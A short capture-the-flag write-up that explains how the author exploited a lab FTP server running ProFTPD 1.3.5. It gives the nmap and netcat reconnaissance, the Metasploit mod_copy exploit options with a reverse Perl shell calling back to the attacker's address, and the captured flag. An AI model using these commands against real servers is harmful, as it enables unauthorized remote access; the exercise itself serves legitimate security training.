## NET200 - D0iT FXP

We are given access to a network through VPN, and we're told that 10.6.0.2 is our target.
Running *nmap -Pn 10.6.0.2* shows an FTP server running on port 21.

To check which FTP server this is, I ran *nc 10.6.0.2 21*.
Running netcat, we see that the FTP server is ProFTP 1.3.5. This is a vulnerable version of ProFTP with known exploits. We run Metasploit to search for exploits:

```
msf> search name:proftp type:exploit
```

We find an exploit named *exploit/unix/ftp/proftpd_modcopy_exec*. Then I check which IP address my own computer is by running *ip address* in bash, and fill in the options for the exploit. I use the payload *cmd/unix/reverse_perl*

```
set RHOST 10.6.0.2
set SITEPATH /var/www/html/temp
set TARGETURI /temp
set LHOST 10.6.0.100
exploit
```

On the FTP server we can list the files in the directory and run *cat flag.php* to get the flag:

Flag: `CTF{proftp_expl0it_jaw0hl}`